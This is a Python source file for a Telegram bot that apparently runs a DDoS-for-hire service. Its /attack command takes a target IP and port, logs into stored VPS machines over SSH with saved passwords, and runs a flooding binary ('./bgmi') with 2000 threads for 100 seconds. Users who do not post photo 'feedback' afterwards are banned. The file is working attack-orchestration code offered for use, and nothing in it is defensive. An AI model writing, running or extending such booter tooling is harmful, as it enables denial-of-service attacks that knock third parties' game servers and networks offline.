import subprocess
import json
import os
import datetime
import asyncio
import paramiko
from telegram import Update, Chat
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
VPS_FILE = "vps.json"  # Store VPS details here
DEFAULT_THREADS = 2000
DEFAULT_PACKET = 10
DEFAULT_DURATION = 100  # Attack duration in seconds
DEFAULT_TIMEOUT = 3  # Global timeout after attack (in seconds)
BAN_DURATION = 100  # Ban duration in seconds (5 minutes)

users = {}
active_vps = {}  # Track active attacks per VPS
pending_feedback = {}

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_vps():
    """Load VPS details from file."""
    try:
        with open(VPS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return []
    except Exception as e:
        print(f"Error loading VPS: {e}")
        return []

def is_banned(user_id):
    """Check if a user is banned and unban if duration expired."""
    if user_id in users and "ban_time" in users[user_id]:
        ban_time = users[user_id]["ban_time"]
        if (datetime.datetime.now() - datetime.datetime.fromisoformat(ban_time)).total_seconds() > BAN_DURATION:
            del users[user_id]["ban_time"]  # Unban user
            save_users()
            return False
        return True
    return False

async def is_group_chat(update: Update) -> bool:
    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]

async def private_chat_warning(update: Update) -> None:
    await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")

def get_available_vps():
    """Return an available VPS which is not running an attack."""
    vps_list = load_vps()
    for vps in vps_list:
        ip = vps["ip"]
        if ip not in active_vps or datetime.datetime.now() > active_vps[ip]:  # Check if VPS is free
            return vps
    return None  # No available VPS

def run_attack_on_vps(vps, target_ip, port):
    """Execute attack remotely via SSH."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(vps["ip"], username=vps["username"], password=vps["password"])
        command = f'./bgmi {target_ip} {port} {DEFAULT_DURATION} {DEFAULT_PACKET} {DEFAULT_THREADS}'
        ssh.exec_command(command)  # Run attack command
        ssh.close()
        return True
    except Exception as e:
        print(f"Error connecting to VPS {vps['ip']}: {e}")
        return False

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    user_id = str(update.message.from_user.id)

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are temporarily banned from using this command due to not providing feedback.")
        return

    if len(context.args) != 2:
        await update.message.reply_text('Usage: /attack <target_ip> <port>')
        return

    target_ip = context.args[0]
    port = context.args[1]

    vps = get_available_vps()

    if not vps:
        await update.message.reply_text("⚠️ No available VPS at the moment. Please try again later.")
        return

    # Mark VPS as active
    active_vps[vps["ip"]] = datetime.datetime.now() + datetime.timedelta(seconds=DEFAULT_DURATION + DEFAULT_TIMEOUT)

    if run_attack_on_vps(vps, target_ip, port):
        await update.message.reply_text(f'🚀 Attack started from VPS {vps["ip"]}: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')
    else:
        await update.message.reply_text(f'❌ Failed to start attack on VPS {vps["ip"]}. Trying another VPS...')
        del active_vps[vps["ip"]]  # Mark as free
        return

    # Wait for attack to complete
    await asyncio.sleep(DEFAULT_DURATION)

    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}. Now waiting for {DEFAULT_TIMEOUT} seconds before allowing a new attack.')

    # Mark user for feedback
    pending_feedback[user_id] = True
    await update.message.reply_text(f"📸 Please send feedback (photo) now! If no feedback is given within 20 seconds, you will be banned.")

    # Wait for 20 seconds to check feedback
    await asyncio.sleep(20)

    # If user didn't send feedback, send reminder
    if pending_feedback.get(user_id, False):
        await update.message.reply_text(f"⚠️ Reminder: @{update.message.from_user.username}, send feedback now! 10 seconds left before ban.")

    # Wait additional 10 seconds
    await asyncio.sleep(10)

    # If user still didn't send feedback, ban them
    if pending_feedback.get(user_id, False):
        users[user_id] = users.get(user_id, {})
        users[user_id]["ban_time"] = datetime.datetime.now().isoformat()
        save_users()
        await update.message.reply_text(f"🚫 User @{update.message.from_user.username} is banned for 5 minutes for not providing feedback.")

async def handle_photo_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle feedback from users (only photos)."""
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    user_id = str(update.message.from_user.id)

    if user_id in pending_feedback:
        del pending_feedback[user_id]  # Remove from pending list
        await update.message.reply_text("✅ Thank you for the feedback! You are not banned.")

        # If user was banned, remove ban
        if is_banned(user_id):
            del users[user_id]["ban_time"]
            save_users()
            await update.message.reply_text("🎉 Your ban has been lifted!")

    else:
        await update.message.reply_text("❌ No feedback was expected from you.")

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo_feedback))

    global users
    users = load_users()
    application.run_polling()

if __name__ == '__main__':
    main()
